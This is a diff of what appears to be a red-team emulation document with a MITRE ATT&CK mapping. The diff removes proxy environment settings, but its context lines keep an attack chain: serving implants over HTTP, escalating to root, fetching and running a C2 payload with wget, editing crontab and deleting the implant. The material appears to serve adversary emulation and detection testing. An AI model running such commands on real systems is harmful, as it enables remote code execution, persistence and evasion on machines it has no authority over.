@@ -61,12 +61,6 @@ pushd implants ; timeout 30 python3 -m http.server 8080 ; popd
 # Escalate privileges to root
 sudo su
 
-# Set up fwdproxy if on a devserver
-export https_proxy="http://fwdproxy:8080" && \
-export http_proxy="http://fwdproxy:8080" && \
-export HTTPS_PROXY=$https_proxy && \
-export HTTP_PROXY=$http_proxy
-
 # Download and execute c2 payload
 wget "http://${PUB_IP_FROM_PREV_STEP}:8080/${IMPLANT_NAME}"
 chmod +x "${IMPLANT_NAME}" &
@@ -81,7 +75,6 @@ echo '' > crontab_new
 sudo crontab crontab_new
 rm crontab_new
 rm "${IMPLANT_NAME}"
-unset https_proxy http_proxy HTTPS_PROXY HTTP_PROXY
 ```
 
 ## MITRE ATT&CK Mapping
